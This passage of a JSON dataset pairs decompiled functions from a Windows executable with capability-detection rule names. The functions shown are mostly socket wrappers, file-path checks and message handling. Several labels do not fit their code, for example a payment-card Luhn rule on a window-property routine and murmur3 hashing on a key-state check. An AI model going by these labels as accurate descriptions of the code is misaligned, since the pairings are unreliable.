{\n                        uVar3 = fcn.0041b830(10);\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(iVar1 + 0x30) = uVar3;\n                }\n                if (*(iVar1 + 0x34) == 0) {\n                    iVar2 = fcn.0041bd04(0x1c);\n                    *(unaff_EBP + 8) = iVar2;\n                    *(unaff_EBP + -4) = 1;\n                    if (iVar2 == 0) {\n                        uVar3 = 0;\n                    }\n                    else {\n                        uVar3 = fcn.0041b830(10);\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    *(iVar1 + 0x34) = uVar3;\n                }\n                if (*(iVar1 + 0x38) == 0) {\n                    iVar2 = fcn.0041bd04(0x1c);\n                    *(unaff_EBP + 8) = iVar2;\n                    *(unaff_EBP + -4) = 2;\n                    if (iVar2 == 0) {\n                        uVar3 = 0;\n                    }\n                    else {\n                        uVar3 = fcn.0041b65a(10);\n                    }\n                    *(iVar1 + 0x38) = uVar3;\n                }\n                goto code_r0x00426de5;\n            }\n            sub.WSOCK32.dll_WSACleanup();\n        }\n        uVar3 = 0;\n    }\n    else {\ncode_r0x00426de5:\n        uVar3 = 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 734
    },
    "00426ef0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00426ef0(uint hostshort, int32_t cp)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint name;\n    int32_t var_ch;\n    \n    fcn.0040b990(&name, 0, 0x10);\n    name._0_2_ = 2;\n    if (cp == 0) {\n        var_ch = sub.WSOCK32.dll_htonl(0);\n    }\n    else {\n        var_ch = sub.WSOCK32.dll_inet_addr(cp);\n        if (var_ch == -1) {\n            sub.WSOCK32.dll_WSASetLastError(0x2726);\n            return false;\n        }\n    }\n    name._2_2_ = sub.WSOCK32.dll_htons(hostshort);\n    iVar1 = sub.WSOCK32.dll_bind(*(in_ECX + 4), &name, 0x10);\n    return iVar1 != -1;\n}\n",
        "token_count": 223
    },
    "0042707e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042707e(uint param_1)\n\n{\n    fcn.0042401d();\n    fcn.0041b9a4(param_1);\n    return;\n}\n",
        "token_count": 42
    },
    "004274e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004274e4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (in_ECX[3] == 0) {\n        do {\n            iVar1 = fcn.00426ff4(arg_8h, arg_ch, arg_10h);\n            if (iVar1 != -1) {\n                return iVar1;\n            }\n            iVar1 = sub.WSOCK32.dll_WSAGetLastError();\n        } while ((iVar1 == 0x2733) && (iVar1 = (**(*in_ECX + 0x44))(1),  iVar1 != 0));\n        iVar1 = -1;\n    }\n    else {\n        sub.WSOCK32.dll_WSASetLastError(0x2734);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 202
    },
    "00427a3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427a3c(int32_t param_1)\n\n{\n    if (*(param_1 + 0x1c) != 0) {\n        (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(0, 0);\n        *(param_1 + 0x1c) = 0;\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "00427a55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427a55(int32_t param_1)\n\n{\n    if (*(param_1 + 0x42) != '\\0') {\n        if (*(param_1 + 0x20) != 0) {\n            (*_sym.imp.ole32.dll_CoRevokeClassObject)(*(param_1 + 0x20));\n            *(param_1 + 0x20) = 0;\n        }\n        *(param_1 + 0x42) = 0;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00404463": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404463(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar2 = (**(*arg_8h + 0x3c))();\n    do {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        if (*(puVar2[1] + 0x18) != -1) {\n            iVar3 = puVar2[1];\n            do {\n                if ((*(iVar3 + 4) == arg_10h[1]) && (*(iVar3 + 0x18) == (*arg_10h != 0))) {\n                    if (*(iVar3 + 0x24) == 0xffffffff) {\n                        if (*(iVar3 + 0x20) == 0xffffffff) {\n                            return iVar3;\n                        }\n                        if (*(iVar3 + 0x20) == arg_ch) {\n                            return iVar3;\n                        }\n                    }\n                    else if ((*(iVar3 + 0x20) < arg_ch || *(iVar3 + 0x20) == arg_ch) && (arg_ch <= *(iVar3 + 0x24))) {\n                        return iVar3;\n                    }\n                }\n                piVar1 = iVar3 + 0x40;\n                iVar3 = iVar3 + 0x28;\n            } while (*piVar1 != -1);\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 347
    },
    "004069f2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004069f2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    iVar1 = *(unaff_EBP + 0xc);\n    if ((iVar1 == 0) || (*(unaff_EBP + 8) == -1)) {\n        iVar1 = *(extraout_ECX + 0x8c);\n        *(unaff_EBP + -0x10) = 0;\n        while (iVar1 != 0) {\n            iVar3 = fcn.0040983a();\n            if (((*(unaff_EBP + 8) == -1) || (*(iVar1 + 8) == *(unaff_EBP + 8))) &&\n               ((*(unaff_EBP + 0xc) == 0 || (*(*(unaff_EBP + 0xc) + 0x38) == *(iVar1 + 0xc))))) {\n                if (*(unaff_EBP + -0x10) == 0) {\n                    *(extraout_ECX + 0x8c) = iVar3;\n                }\n                else {\n                    *(*(unaff_EBP + -0x10) + 0x18) = iVar3;\n                }\n                if ((*(iVar1 + 0xc) != 0) && (piVar2 = *(*(iVar1 + 0xc) + 0x88),  piVar2 != NULL)) {\n                    (**(*piVar2 + 4))(iVar1, 0);\n                }\n                if (iVar1 != 0) {\n                    fcn.0041bd2d(iVar1);\n                }\n            }\n            iVar1 = iVar3;\n            if (*(unaff_EBP + -0x10) != 0) {\n                uVar4 = fcn.0040983a();\n                *(unaff_EBP + -0x10) = uVar4;\n            }\n        }\n    }\n    else {\n        iVar3 = fcn.0041bd04(0x1c);\n        *(unaff_EBP + 0xc) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.004097f7(*(extraout_ECX + 0x8c), *(unaff_EBP + 8), 0);\n        }\n        *(extraout_ECX + 0x8c) = iVar3;\n        *(iVar3 + 0xc) = *(iVar1 + 0x38);\n        piVar2 = *(extraout_ECX + 0x8c);\n        *(unaff_EBP + -4) = 0xffffffff;\n        *piVar2 = extraout_ECX;\n        (**(**(*(extraout_ECX + 0x8c) + 0xc) + 0xb0))();\n        (**(**(*(*(extraout_ECX + 0x8c) + 0xc) + 0x88) + 4))(*(extraout_ECX + 0x8c), 1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 821
    },
    "0041ba8b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041ba8b(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 == 0xffffffff) {\n        uVar4 = 0;\n        if (*(param_1 + 8) != 0) {\n            ppiVar1 = *(param_1 + 4);\n            do {\n                piVar3 = *ppiVar1;\n                if (piVar3 != NULL) break;\n                uVar4 = uVar4 + 1;\n                ppiVar1 = ppiVar1 + 1;\n            } while (uVar4 < *(param_1 + 8));\n        }\n    }\n    piVar5 = *piVar3;\n    if (piVar5 == NULL) {\n        uVar4 = *(param_1 + 8);\n        uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n        if (uVar2 < uVar4) {\n            ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5 != NULL) break;\n                uVar2 = uVar2 + 1;\n                ppiVar1 = ppiVar1 + 1;\n            } while (uVar2 < uVar4);\n        }\n    }\n    *param_2 = piVar5;\n    *param_3 = piVar3[1];\n    *param_4 = piVar3[2];\n    return;\n}\n",
        "token_count": 413
    },
    "0041d595": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041d595(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.0041d266();\n    if (param_2 == -1) {\n        param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n    }\n    *(*param_1 + -8) = param_2;\n    *(*param_1 + param_2) = 0;\n    return;\n}\n",
        "token_count": 103
    },
    "0042126f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042126f(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    bVar3 = false;\n    if (*(param_1 + 4) != -1) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 4));\n        bVar3 = iVar1 == 0;\n    }\n    *(param_1 + 4) = 0xffffffff;\n    *(param_1 + 8) = 0;\n    fcn.0041d248();\n    if (bVar3) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(0);\n        fcn.00421779(uVar2);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00421380": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n\nuint __cdecl fcn.00421380(uint lpRootPathName, uint lpFileName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpFindFileData;\n    uint lpString2;\n    uint var_18h;\n    uint lpFilePart;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    uVar1 = *(unaff_EBP + 8);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(*(unaff_EBP + 0xc), 0x104, uVar1, unaff_EBP + -0x14);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(uVar1, *(unaff_EBP + 0xc), 0x104);\n        uVar3 = 0;\n    }\n    else {\n        *(unaff_EBP + 8) = *0x449654;\n        uVar3 = 0;\n        *(unaff_EBP + -4) = 0;\n        fcn.00421450(uVar1, unaff_EBP + 8);\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)\n                          (*(unaff_EBP + 8), 0, 0, 0, unaff_EBP + -0x18, unaff_EBP + -0x10, 0, 0);\n        if (iVar2 != 0) {\n            if ((*(unaff_EBP + -0x10) & 2) == 0) {\n                (*_sym.imp.USER32.dll_CharUpperA)(uVar1);\n            }\n            if ((*(unaff_EBP + -0x10) & 4) == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(*(unaff_EBP + 0xc), unaff_EBP + -0x158);\n                if (iVar2 != -1) {\n                    (*_sym.imp.KERNEL32.dll_FindClose)(iVar2);\n                    (*_sym.imp.KERNEL32.dll_lstrcpyA)(*(unaff_EBP + -0x14), unaff_EBP + -300);\n                }\n            }\n            uVar3 = 1;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041d2bd();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 598
    },
    "00422c69": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00422c69(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = *0x449654;\n    *(unaff_EBP + -4) = 0;\n    fcn.004205ae(*(unaff_EBP + 8));\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    if (arg_10h_00 == -1) {\n        arg_10h_00 = *(unaff_EBP + 8);\n    }\n    uVar1 = fcn.00422c31(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), arg_10h_00);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041d2bd();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 327
    },
    "00424408": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00424408(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar1;\n    if (iVar1 == -1) {\n        fcn.0041b368();\n    }\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 + 7);\n    return param_1;\n}\n",
        "token_count": 180
    },
    "0042444a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042444a(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.00424716(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 229
    },
    "00426f63": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426f63(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != -1) {\n        sub.WSOCK32.dll_closesocket(*(param_1 + 4));\n        fcn.0042720d(*(param_1 + 4), param_1);\n        *(param_1 + 4) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00426f83": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00426f83(uint name, uint hostshort)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t var_ch;\n    \n    fcn.0040b990(&var_10h, 0, 0x10);\n    var_10h._0_2_ = 2;\n    var_ch = sub.WSOCK32.dll_inet_addr(name);\n    if (var_ch == -1) {\n        iVar1 = sub.WSOCK32.dll_gethostbyname(name);\n        if (iVar1 == 0) {\n            sub.WSOCK32.dll_WSASetLastError(0x2726);\n            return 0;\n        }\n        var_ch = ***(iVar1 + 0xc);\n    }\n    var_10h._2_2_ = sub.WSOCK32.dll_htons(hostshort);\n    uVar2 = (**(*in_ECX + 0x34))(&var_10h, 0x10);\n    return uVar2;\n}\n",
        "token_count": 247
    },
    "00427022": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00427022(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042401d();\n    iVar1 = sub.WSOCK32.dll_WSAAsyncSelect(*(param_1 + 4), *(iVar1 + 0x2c), 0x373, param_2);\n    return iVar1 != -1;\n}\n",
        "token_count": 94
    },
    "0042704f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0042704f(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CAsyncSocket.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != 0xffffffff) {\n        fcn.00426f63(extraout_ECX);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 165
    },
    "0042724c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042724c(int32_t arg_8h, uint32_t argp)\n\n{\n    int32_t iVar1;\n    int32_t *arg_ch;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_8h != 0) || (argp != 0)) {\n        iVar1 = fcn.0042707e(arg_8h, 1);\n        if (iVar1 == 0) {\n            arg_ch = fcn.0042707e(arg_8h, 0);\n            if (arg_ch == NULL) {\n                arg_ch = fcn.0042707e(0xffffffff, 0);\n                arg_ch[1] = arg_8h;\n                fcn.0042716b(0xffffffff, 0);\n                fcn.004270a2(arg_ch[1], arg_ch, 0);\n            }\n            uVar2 = argp & 0xffff;\n            uVar3 = argp >> 0x10;\n            if (uVar2 == 1) {\n                iVar1 = sub.WSOCK32.dll_ioctlsocket(arg_ch[1], 0x4004667f, &argp);\n                if (iVar1 == -1) {\n                    uVar3 = sub.WSOCK32.dll_WSAGetLastError();\n                }\n                if ((argp != 0) || (uVar3 != 0)) {\n                    (**(*arg_ch + 0x1c))(uVar3);\n                }\n            }\n            else if (uVar2 == 2) {\n                (**(*arg_ch + 0x20))(uVar3);\n            }\n            else if (uVar2 == 4) {\n                (**(*arg_ch + 0x24))(uVar3);\n            }\n            else if (uVar2 == 8) {\n                (**(*arg_ch + 0x28))(uVar3);\n            }\n            else if (uVar2 == 0x10) {\n                (**(*arg_ch + 0x2c))(uVar3);\n            }\n            else if (uVar2 == 0x20) {\n                (**(*arg_ch + 0x30))(uVar3);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "0042732a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042732a(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    \n    arg_8h = sub.WSOCK32.dll_socket(param_5, param_2, param_4);\n    *(param_1 + 4) = arg_8h;\n    if (arg_8h == -1) {\n        uVar1 = 0;\n    }\n    else {\n        fcn.004270a2(arg_8h, param_1, 0);\n        uVar1 = fcn.00427022(param_5);\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "0042739e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __thiscall fcn.0042739e(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.WSOCK32.dll_connect(*(param_1 + 4), param_2, param_3);\n    return iVar1 != -1;\n}\n",
        "token_count": 74
    },
    "00427431": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00427431(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CSocket.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[1] != 0xffffffff) {\n        fcn.004274c0();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042704f();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 199
    },
    "004274c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004274c0(int32_t param_1)\n\n{\n    if (*(param_1 + 4) != -1) {\n        fcn.004273f8();\n        fcn.00427022(0);\n        fcn.00426f63();\n        *(param_1 + 4) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00427582": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00427582(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    do {\n        iVar1 = fcn.0042700b(arg_8h, arg_ch, arg_10h);\n        if (iVar1 != -1) {\n            return iVar1;\n        }\n        iVar1 = sub.WSOCK32.dll_WSAGetLastError();\n    } while ((iVar1 == 0x2733) && (iVar1 = (**(*in_ECX + 0x44))(2),  iVar1 != 0));\n    return -1;\n}\n",
        "token_count": 149
    },
    "00417390": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417390(uint32_t param_1, uint param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint16_t extraout_var;\n    uint32_t uVar3;\n    uint uVar4;\n    uchar *puVar5;\n    \n    iVar2 = fcn.004168a0(param_1);\n    if (iVar2 == 0) {\n        fcn.004184a0(param_1, param_2, 0, param_3);\n        return;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetPropA)(param_1, *0x44f3f4);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        uVar4 = 0x1944;\n        uVar3 = param_1;\n        puVar5 = &stack0xfffffff4;\n        (*_sym.imp.USER32.dll_SendMessageA)(param_1, 0x1944, 0);\n        if (puVar5 == 0x29a) {\n            (*pcVar1)(param_1, 0x1943, 0);\n            if (&stack0xfffffff4 == 0x29a) {\n                (*_sym.imp.USER32.dll_RemovePropA)(param_1, *0x44f3ee);\n                fcn.004184a0(param_1, uVar3 & 0xffff | extraout_var << 0x10, 0, uVar4);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "0040af8b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040af8b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0040ddbf(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "0040a3f2": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.0040a3f2(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0x400, 0, 0);\n    if (uVar1 >> 0x10 == 0x534b) {\n        uVar1 = uVar1 & 0xffff;\n    }\n    else {\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0041c0fa": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint fcn.0041c0fa(int32_t param_1)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((((*(param_1 + 4) == 0x100) && (*(param_1 + 8) == 0x70)) && ((*(param_1 + 0xc) >> 0x10 & 0x4000) == 0)) &&\n       (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x10),  -1 < iVar2 && (iVar2 = (*pcVar1)(0x11),  -1 < iVar2)) &&\n        (iVar2 = (*pcVar1)(0x12),  -1 < iVar2)))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 191
    },
    "0041d2e7": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041d2e7(uint *param_1, uint32_t param_2)\n\n{\n    int32_t arg_10h;\n    \n    *param_1 = *0x449654;\n    if (param_2 != 0) {\n        if (param_2 >> 0x10 == 0) {\n            fcn.004205ae(param_2 & 0xffff);\n        }\n        else {\n            arg_10h = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_2);\n            if (arg_10h != 0) {\n                fcn.0041d12a(arg_10h);\n                fcn.0040bb50(*param_1, param_2, arg_10h);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 181
    },
    "0041da74": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.0041da74(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00424808(0x423997);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x44) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x48) = uVar2;\n    *(iVar1 + 0x4c) = uVar2 >> 0x10;\n    return iVar1 + 0x34;\n}\n",
        "token_count": 138
    },
    "0041dc24": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
